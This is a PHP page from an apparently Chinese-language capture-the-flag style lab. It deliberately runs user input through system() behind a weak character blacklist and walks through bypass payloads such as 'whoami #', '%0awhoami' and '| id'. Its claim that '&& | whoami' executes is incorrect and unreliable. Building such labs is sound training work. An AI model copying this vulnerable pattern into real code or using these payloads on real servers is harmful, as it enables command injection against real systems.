<?php
/**
 * Level 3: 黑名单过滤绕过
 * 难度: ★★☆☆☆
 * 描述: 过滤了部分危险字符，需要绕过
 * 目标: 使用注释符等技巧绕过黑名单
 */

$message = '';
$output = '';
$blocked = false;

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    // 黑名单过滤
    $blacklist = array(';', '&&', '||', '`');

    foreach ($blacklist as $bad) {
        if (strpos($cmd, $bad) !== false) {
            $blocked = true;
            $message = '<div class="error">❌ 检测到危险字符: ' . htmlspecialchars($bad) . '</div>';
            break;
        }
    }

    if (!$blocked) {
        $full_cmd = "echo 'Result: ' && " . $cmd;

        ob_start();
        system($full_cmd . " 2>&1");
        $output = ob_get_clean();
        $message = '<div class="success">✅ 命令执行成功</div>';
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Level 3 - 黑名单过滤绕过</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
        }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header .difficulty { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #667eea;
        }
        .info-box h3 { color: #333; margin-bottom: 10px; }
        .info-box ul, .info-box ol { margin-left: 20px; line-height: 1.8; color: #666; }
        .form-box {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background: #5568d3; }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #dc3545;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #ffc107;
        }
        .code-box {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box {
            background: #2d2d2d;
            color: #00ff00;
            border: 1px solid #444;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
        }
        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
        .warning-box {
            background: #d1ecf1;
            color: #0c5460;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #17a2b8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 3 - 黑名单过滤绕过</h1>
            <div class="difficulty">难度: ★★☆☆☆ | 技巧: 注释符、换行符</div>
        </div>

        <div class="content">
            <div class="info-box">
                <h3>📋 关卡说明</h3>
                <ul>
                    <li>服务器使用黑名单过滤危险字符</li>
                    <li>被过滤的字符: <code>;</code> <code>&&</code> <code>||</code> <code>`</code></li>
                    <li>你的命令会被拼接到: <code>echo 'Result: ' && YOUR_CMD</code></li>
                    <li>需要绕过黑名单执行自己的命令</li>
                </ul>
            </div>

            <div class="warning-box">
                <strong>🎯 挑战目标:</strong> 虽然 <code>&&</code> 被过滤了，但是命令本身会被拼接到一个包含 <code>&&</code> 的语句中。你需要想办法让自己的命令独立执行！
            </div>

            <div class="info-box">
                <h3>💡 绕过技巧</h3>
                <ol>
                    <li><strong>注释符 (#):</strong> 注释掉后面的内容
                        <ul>
                            <li>示例: <code>whoami #</code></li>
                            <li>实际执行: <code>echo 'Result: ' && whoami # 后面的内容被注释</code></li>
                        </ul>
                    </li>
                    <li><strong>换行符 (%0a):</strong> 开始新的命令行
                        <ul>
                            <li>示例: <code>%0awhoami</code></li>
                            <li>实际执行: 换行后执行新命令</li>
                        </ul>
                    </li>
                    <li><strong>管道符 (|):</strong> 虽然 <code>||</code> 被禁，但单个 <code>|</code> 没被禁
                        <ul>
                            <li>示例: <code>| whoami</code></li>
                            <li>实际执行: 忽略前面的输出，执行后面的命令</li>
                        </ul>
                    </li>
                </ol>
            </div>

            <?php echo $message; ?>

            <div class="form-box">
                <h3>命令执行测试</h3>
                <p style="margin-bottom: 10px; color: #666;">
                    被过滤: <code style="color: #dc3545;">;</code> <code style="color: #dc3545;">&&</code>
                    <code style="color: #dc3545;">||</code> <code style="color: #dc3545;">`</code>
                </p>
                <form method="GET">
                    <label>输入命令:</label>
                    <input type="text" name="cmd" placeholder="whoami #" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" />
                    <input type="submit" value="执行命令" />
                </form>
            </div>

            <?php if ($output !== ''): ?>
            <div class="result-box">
                <h3 style="color: #00ff00; margin-bottom: 10px;">执行结果:</h3>
                <pre><?php echo htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></pre>
            </div>
            <?php endif; ?>

            <div class="hint">
                <strong>🔍 漏洞代码:</strong>
                <div class="code-box">$blacklist = array(';', '&&', '||', '`');

// 检查黑名单
foreach ($blacklist as $bad) {
    if (strpos($cmd, $bad) !== false) {
        die("检测到危险字符");
    }
}

// 拼接命令
$full_cmd = "echo 'Result: ' && " . $cmd;
system($full_cmd);</div>

                <p><strong>绕过方法1 - 使用注释符:</strong></p>
                <div class="code-box"># 输入
?cmd=whoami #

# 实际执行
echo 'Result: ' && whoami #
# # 后面的内容都被注释掉了，但前面的 && 仍然有效</div>

                <p><strong>绕过方法2 - 使用换行符:</strong></p>
                <div class="code-box"># 输入 (URL编码)
?cmd=%0awhoami

# 实际执行
echo 'Result: ' &&
whoami
# 换行后开始新的命令</div>

                <p><strong>绕过方法3 - 使用管道符:</strong></p>
                <div class="code-box"># 输入
?cmd=| whoami

# 实际执行
echo 'Result: ' && | whoami
# 管道符会忽略前面的内容</div>

                <p><strong>尝试执行:</strong></p>
                <ul>
                    <li><code>whoami #</code> - 查看当前用户</li>
                    <li><code>pwd #</code> - 查看当前目录</li>
                    <li><code>ls #</code> - 列出文件</li>
                    <li><code>%0als</code> - 使用换行符</li>
                    <li><code>| id</code> - 使用管道符</li>
                </ul>

                <p style="margin-top: 15px;"><strong>黑名单的问题:</strong></p>
                <ul>
                    <li>无法穷举所有危险字符</li>
                    <li>容易被各种技巧绕过</li>
                    <li>不同系统有不同的特殊字符</li>
                    <li>应该使用白名单而不是黑名单</li>
                </ul>
            </div>

            <a href="index.php" class="back-link">← 返回首页</a> |
            <a href="level2.php" class="back-link">← 上一关</a> |
            <a href="level4.php" class="back-link">下一关 →</a>
        </div>
    </div>
</body>
</html>
